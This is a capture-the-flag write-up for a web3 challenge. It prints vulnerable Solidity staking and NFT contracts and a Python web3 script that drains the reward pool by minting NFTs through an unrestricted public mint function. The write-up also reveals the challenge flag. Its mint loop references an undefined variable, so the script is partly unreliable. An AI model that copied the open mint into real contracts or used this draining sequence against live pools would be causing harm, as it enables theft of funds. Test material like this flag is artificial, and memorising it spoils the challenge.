# NFTrap

Draining a reward pool from an NFT staking functionality

**Event**: Hackday Quals 2026

**Category**: web3

**Difficulty**: medium

**Points**: 100

**Solves**: 142

---

## Challenge description
While investigating, our team discovered secret research from Millennium Systems. It appears they were secretly experimenting with a distributed ledger prototype years before blockchain technology was supposed to exist. The project, codenamed Epoch Chain, aimed to anchor fragments of human cognition into non-fungible digital artifacts.
> IP:port

**NFT.sol**:
```java
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract SimpleNFT is ERC721 {
    address public owner;

    constructor(string memory name, string memory symbol, address _owner) ERC721(name, symbol) {
        owner = _owner;
    }

    function mint(address to, uint256 tokenId) external returns (uint256) {
        _mint(to, tokenId);
        return tokenId;
    }
}
```

**Setup.sol**:
```java
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;
import {Staking} from "./Staking.sol";
import {SimpleNFT} from "./NFT.sol";

contract Setup {
    Staking public stakingContract;

    SimpleNFT public SahursNFT;
    SimpleNFT public AgarthaNFT;
    SimpleNFT public SixSevenNFT;

    address public player;
    uint256[] public tokenIDs;

    constructor(address _player) payable {
        require(msg.value >= 10 ether);
        player = _player;
        stakingContract = new Staking{value: 10 ether}();

        SahursNFT = stakingContract.SahursNFT();
        AgarthaNFT = stakingContract.AgarthaNFT();
        SixSevenNFT = stakingContract.SixSevenNFT();

        tokenIDs = [1, 2, 3];
        stakingContract.mintNFT(address(AgarthaNFT), tokenIDs);

        tokenIDs = [1];
        stakingContract.mintNFT(address(SahursNFT), tokenIDs);

        tokenIDs = [1, 67];
        stakingContract.mintNFT(address(SixSevenNFT), tokenIDs);
    }

    function isSolved() public view returns (bool) {
        return (address(stakingContract.rewardToken()).balance <= 2.5 ether);
    }
}
```

**Staking.sol**
```java
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;
import {SimpleNFT} from "./NFT.sol";
import {BrainrotToken} from "./Token.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";


contract Staking is Ownable {
    struct StakeInfo {
        uint256 tokenId;
        uint256 stakedAt;
        uint256 lastClaimTime;
        address owner;
    }

    uint256 public INITIAL_SUPPLY = 1_000_000;
    uint256 public REWARD_RATE_PER_SECOND = 3; // 1 token per second base rate
    uint256 public timestamp;
    bool public inTheFuture;

    SimpleNFT public SahursNFT;
    SimpleNFT public AgarthaNFT;
    SimpleNFT public SixSevenNFT;

    address public signer;

    mapping(address => mapping(uint256 => StakeInfo)) public stakes; // map nftcollection => tokenId
    mapping(address => mapping(address => uint256[])) public StakedTokens;
    mapping(bytes32 => bool) public validHashes;
    mapping(address => uint256) public rarityWeights;
    mapping(address => uint256) public NFTprices;

    ERC20 public rewardToken;

    constructor() payable Ownable(msg.sender) {
        require(msg.value == 10 ether);

        rewardToken = new BrainrotToken{value: 10 ether}("Brainrot", "BRT", INITIAL_SUPPLY, address(this));

        SahursNFT = new SimpleNFT("Sahurs NFT", "SAHURS", address(this));
        AgarthaNFT = new SimpleNFT("Agartha NFT", "AGARTHA", address(this));
        SixSevenNFT = new SimpleNFT("Six Seven NFT", "67", address(this));

        rarityWeights[address(SahursNFT)] = 31;
        rarityWeights[address(AgarthaNFT)] = 3;
        rarityWeights[address(SixSevenNFT)] = 1;

        NFTprices[address(SahursNFT)] = 1 ether;
        NFTprices[address(AgarthaNFT)] = 0.001 ether;
        NFTprices[address(SixSevenNFT)] = 0.001 ether;

        timestamp = block.timestamp;
    }

    function stakeNFTs(uint256 tokenId, address nftCollection) external {
        require(stakes[nftCollection][tokenId].stakedAt == 0, "Already staked");
        require(IERC721(nftCollection).ownerOf(tokenId) == msg.sender, unicode"You're NOT the owner of this NFT 🥀😭🙏");
        uint256 _rarityWeight = rarityWeights[nftCollection];

        IERC721(nftCollection).transferFrom(msg.sender, address(this), tokenId);

        stakes[nftCollection][tokenId] =
            StakeInfo({tokenId: tokenId, stakedAt: timestamp, lastClaimTime: timestamp, owner: msg.sender});

        bytes32 hash = keccak256(abi.encode(msg.sender, tokenId, _rarityWeight));
        validHashes[hash] = true;
        StakedTokens[nftCollection][msg.sender].push(tokenId);
    }

    function unstakeNFTs(uint256 _tokenId, address nftCollection) external {
        StakeInfo memory s = stakes[nftCollection][_tokenId];

        require(s.owner == msg.sender);
        require(s.stakedAt > 0, "Not staked");

        uint256 rewards = _calculateRewards(msg.sender, _tokenId, rarityWeights[nftCollection]);
        delete stakes[nftCollection][_tokenId];

        if (rewards > 0) {
            rewardToken.transfer(msg.sender, rewards);
        }

        IERC721(nftCollection).transferFrom(address(this), msg.sender, _tokenId);

        bytes32 hash = keccak256(abi.encode(msg.sender, _tokenId, rarityWeights[nftCollection]));
        validHashes[hash] = false;

        _removeTokenFromUserList(msg.sender, _tokenId, nftCollection);

    }

    function buyNFT(address nftCollection, uint256 _tokenId) external payable {

        require(NFTprices[nftCollection] != 0, "This NFT Collection is not supported");
        require(msg.value == NFTprices[nftCollection], "You need to send the exact price");
        require(IERC721(nftCollection).ownerOf(_tokenId) == address(this), "This NFT has already been bought");

        IERC721(nftCollection).transferFrom(address(this), msg.sender, _tokenId);
    }

    function claimRewards(uint256 _tokenId, uint256 _rarityWeight, address nftCollection) external {
        StakeInfo storage s = stakes[nftCollection][_tokenId];
        require(s.owner == msg.sender);

        bytes32 hash = keccak256(abi.encode(msg.sender, _tokenId, _rarityWeight));
        require(validHashes[hash] == true, "You don't have the rights to claim this token");
        uint256 totalRewards = 0;
        uint256 rewards = _calculateRewards(nftCollection, _tokenId, _rarityWeight);

        if (rewards > 0) {
            s.lastClaimTime = timestamp;
            totalRewards += rewards;
        }

        require(totalRewards > 0, "No rewards to claim");
        rewardToken.transfer(msg.sender, totalRewards);
    }

    function getStakedToken(address _user, address nftCollection) external view returns (uint256[] memory) {
        return StakedTokens[nftCollection][_user];
    }

    function getStakeInfos(uint256 _tokenId, address nftCollection) external view returns (StakeInfo memory) {
        return stakes[nftCollection][_tokenId];
    }

    function JumpInTime() external {
        require(inTheFuture == false, "Can't jump in time twice");
        timestamp += 365 days;
        inTheFuture = true;
    }

    function mintNFT(address nftCollection, uint256[] calldata _tokenIDs) external onlyOwner {
        for (uint256 i = 0; i < _tokenIDs.length; i++) {
            SimpleNFT(nftCollection).mint(address(this), _tokenIDs[i]);
        }
    }

    function _calculateRewards(address nftCollection, uint256 _tokenId, uint256 _rarityWeight) private view returns (uint256) {
        StakeInfo memory stakeInfo = stakes[nftCollection][_tokenId];

        if (stakeInfo.stakedAt == 0) {
            return 0;
        }

        uint256 timeStaked = timestamp - stakeInfo.lastClaimTime;
        uint256 baseRewards = timeStaked * REWARD_RATE_PER_SECOND;
        uint256 weightedRewards = (baseRewards * _rarityWeight) / 10000;

        return weightedRewards;
    }

    function _removeTokenFromUserList(address _user, uint256 _tokenId, address nftCollection) private {
        uint256[] storage userStakes = StakedTokens[nftCollection][_user];

        for (uint256 i = 0; i < userStakes.length; i++) {
            if (userStakes[i] == _tokenId) {
                delete userStakes[i];
            }
        }
    }
}
```

**Token.sol**:
```java
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;
import {SimpleNFT} from "./NFT.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract BrainrotToken is ERC20 {
    address public owner;

    constructor(string memory name_, string memory symbol_, uint256 initialSupply, address _owner)
        payable
        ERC20(name_, symbol_)
    {
        _mint(msg.sender, initialSupply);
        require(msg.value == 10 ether);
        owner = _owner;
    }

    function swapForETH(uint256 tokenAmount) external {
        require(tokenAmount > 0, "Invalid amount");

        uint256 ethBalance = address(this).balance;
        uint256 supply = totalSupply();
        uint256 ethAmount = (ethBalance * tokenAmount) / supply;

        _transfer(msg.sender, address(this), tokenAmount);

        (bool success,) = msg.sender.call{value: ethAmount}("");
        require(success, "ETH transfer failed");
    }
}
```

---

## Setup
Calling `nc IP port` gives us 3 options: start an instance, kill an instance and get flag. After starting an instance, we write the given details into environment variables as such:
```bash
export UUID           =  some-hex-string
export RPC            =  http://IP:PORT/UUID
export PRIVATE_KEY    =  32-byte-address
export PLAYER_ADDRESS =  20-byte-address
export CHALLENGE      =  20-byte-address
```

---

## Understand the contract
A **SimpleNFT** has an owner and a public mint method.

**BrainrotToken** is a custom token that can be swapped for ether according to a product formula, similar to [Uniswap](https://docs.uniswap.org/contracts/v2/concepts/protocol-overview/how-uniswap-works) or other decentralized exchanges (except here, we can only swap BRT for ETH, not viceversa).

The **Staking** contract implements a regular staking mechanism for our 3 NFT types: we can deposit NFTs in this contract in exchange for some rewards - the more tokens you deposit and the longer they stay in the deposit, the more rewards you will obtain. It initializes a **rewardToken** with a balance of 10 ether, some rarity weights and NFT prices in ether.

The **Staking** contract methods:
- **mint** some NFTs and keep them - this method can only be called by **Setup**,
- **buyNFT** - buy NFTs from this contract for the prices initialized in the constructor,
- **stakeNFTs** and **unstakeNFTs** - deposit your NFTs and get them back,
- **\_calculateRewards** based on rarity weight and how long the NFT has been staked for,
- **claimRewards** for an NFT,
- **JumpInTime** - simulate a time skip, can only be done once.

The **Setup** contract makes the **Staking** contract mint 6 NFTs with different IDs. The challenge is solved when we bring the rewardToken balance from Staking contract below 2.5 ether.


Since this is a CTF challenge, as expected, buying all the NFTs, staking them, skipping time and claiming rewards does not drain the rewards pool enough.


After reading the **Staking** contract 100 times you may realize that the **NFT** contract provides a public mint function, so despite not being able to mint NFTs through the Staking contract, we can still mint our own NFTs!

So the strategy is to simply mint a lot of rare NFTs, stake them, skip time and claim rewards. Easy.

---

## Solve the challenge
Connect to the blockchain using the previously set environment variables:
```python
import os
from web3 import Web3
from eth_account import Account
import time

UUID = os.getenv('UUID')
RPC = os.getenv('RPC')
PRIVATE_KEY = os.getenv('PRIVATE_KEY')
PLAYER_ADDRESS = os.getenv('PLAYER_ADDRESS')
SETUP_ADDRESS = os.getenv('SETUP')
STAKING_ADDRESS = os.getenv('CHALLENGE')

w3 = Web3(Web3.HTTPProvider(RPC))
account = Account.from_key(PRIVATE_KEY)

# Insert contract ABIs here

setup = w3.eth.contract(address=Web3.to_checksum_address(SETUP_ADDRESS), abi=SETUP_ABI)
staking = w3.eth.contract(address=Web3.to_checksum_address(STAKING_ADDRESS), abi=STAKING_ABI)

sahurs_nft_address = staking.functions.SahursNFT().call()
reward_token_address = staking.functions.rewardToken().call()

sahurs_nft = w3.eth.contract(address=sahurs_nft_address, abi=NFT_ABI)
reward_token = w3.eth.contract(address=reward_token_address, abi=TOKEN_ABI)
```

Helper functions:
``` python
def send_tx(tx):
    tx['from'] = account.address
    tx['nonce'] = w3.eth.get_transaction_count(account.address)
    tx['gas'] = 3000000
    tx['gasPrice'] = w3.eth.gas_price
    
    signed = account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    
    if receipt['status'] == 1:
        print(f"TX: {tx_hash.hex()}")
    else:
        print(f"TX failed: {tx_hash.hex()}")
    
    return receipt

def check_token_ownership(token_id):
    try:
        owner = sahurs_nft.functions.ownerOf(token_id).call()
        return owner.lower() == account.address.lower()
    except:
        return False
```

Mint our own tokens:
```python
n = 10
tokens = []
i = 2 # token with ID 1 exists already

while len(tokens) < n:
	if not check_token_ownership(i):
        print(i)
        try:
            tx = sahurs_nft.functions.mint(account.address, next_id).build_transaction({
                'chainId': w3.eth.chain_id,
                'gas': 500000
            })
            receipt = send_tx(tx)
            if receipt['status'] == 1:
                tokens.append(i)
            time.sleep(0.5)
        except Exception as e:
            print(f"{i} failed: {e}")
    i += 1
```

Stake the created tokens:
```python
tx = sahurs_nft.functions.setApprovalForAll(staking.address, True).build_transaction({
    'chainId': w3.eth.chain_id,
    'gas': 500000
})
send_tx(tx)

for token in tokens:
    print(f"token {token}")
    tx = staking.functions.stakeNFTs(token, sahurs_nft_address).build_transaction({
        'chainId': w3.eth.chain_id,
        'gas': 500000
    })
    send_tx(tx)
    time.sleep(0.5)
```

Time jump:
```python
jumped = staking.functions.inTheFuture().call()
if not jumped:
    tx = staking.functions.JumpInTime().build_transaction({
        'chainId': w3.eth.chain_id,
        'gas': 500000
    })
    send_tx(tx)
else:
    print("Time jump failed")
```

Claim rewards for tokens:
```python
rarity = 31  # Sahurs NFT rarity weight
for token in tokens:
    tx = staking.functions.claimRewards(token, rarity, sahurs_nft_address).build_transaction({
        'chainId': w3.eth.chain_id,
        'gas': 500000
    })
    send_tx(tx)
    time.sleep(0.5)
```

Swap BRT for ether:
```python
brt_balance = reward_token.functions.balanceOf(account.address).call()

if brt_balance > 0:
    tx = reward_token.functions.swapForETH(brt_balance).build_transaction({
        'chainId': w3.eth.chain_id,
        'gas': 500000
    })
    send_tx(tx)
    
    eth_balance = w3.eth.get_balance(account.address)
    print(f"Current ether balance: {w3.from_wei(eth_balance, 'ether')}")
else:
    print("No BRT")
```

Check if we solved the challenge:
``` python
is_solved = setup.functions.isSolved().call()
reward_balance = w3.eth.get_balance(reward_token_address)

print(f"Reward balance: {w3.from_wei(reward_balance, 'ether')}")
print(is_solved)
```

### Get the flag
Congratulations! You have solved it! Here's the flag:

`HACKDAY{181fa14e1ca06c9f58f05c5f9f1028c003f505e176f765a63501d28c8604caf2}`
